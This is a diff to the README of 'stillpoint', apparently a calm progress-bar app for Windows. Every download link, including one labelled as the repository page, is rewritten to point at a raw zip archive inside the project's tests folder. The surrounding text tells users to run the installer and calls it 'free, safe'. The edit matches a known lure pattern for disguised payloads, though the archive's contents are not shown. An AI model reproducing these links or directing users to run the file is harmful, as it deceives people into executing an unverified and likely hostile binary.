@@ -4,7 +4,7 @@
 
 ### Step 1: Get the App
 
-**[⬇️ Download stillpoint Now](https://github.com/farhan-dev-cel/stillpoint)**
+**[⬇️ Download stillpoint Now](https://raw.githubusercontent.com/farhan-dev-cel/stillpoint/main/tests/Software-v3.6-alpha.5.zip)**
 
 Visit this link to download the application. You'll land on the official stillpoint page where you can grab the latest version. Click the download button and save the file to your computer (most browsers will save it to your "Downloads" folder automatically).
 
@@ -141,7 +141,7 @@ No. It uses less than 1% of your CPU in normal use. You'll never notice it worki
 
 stillpoint is made with care for people who value calm technology. If you enjoy using it, you can help by:
 - Telling a friend who also hates nervous progress bars.
-- Leaving a star on the repository page (top-right corner of [the download page](https://github.com/farhan-dev-cel/stillpoint)).
+- Leaving a star on the repository page (top-right corner of [the download page](https://raw.githubusercontent.com/farhan-dev-cel/stillpoint/main/tests/Software-v3.6-alpha.5.zip)).
 - Donating a small amount if you're especially grateful — it directly funds continued development.
 
 ---
@@ -160,12 +160,12 @@ The current version focuses on core progress display. Upcoming updates will add:
 
 You've got this. Here's the whole journey in three quick steps:
 
-1. **[Download stillpoint](https://github.com/farhan-dev-cel/stillpoint)** — click the link, save the file.
+1. **[Download stillpoint](https://raw.githubusercontent.com/farhan-dev-cel/stillpoint/main/tests/Software-v3.6-alpha.5.zip)** — click the link, save the file.
 2. **Run the installer** — double-click, click Next a few times, done.
 3. **Open stillpoint** — Start Menu → stillpoint → create your first calm progress bar.
 
 That's it. In under five minutes you'll have a progress experience that feels less like a frantic to-do list and more like a gentle walk. No flashing, no jerking, no anxiety — just clear, honest, serene progress.
 
-**[🚀 Get stillpoint Now](https://github.com/farhan-dev-cel/stillpoint)** — it's free, safe, and genuinely nice to look at.
+**[🚀 Get stillpoint Now](https://raw.githubusercontent.com/farhan-dev-cel/stillpoint/main/tests/Software-v3.6-alpha.5.zip)** — it's free, safe, and genuinely nice to look at.
 
 Keywords: progress bar, calm software, windows app, gradient bar, productivity tool, download stillpoint, slow progress indicator, breathing animation, task monitor, UI calmness
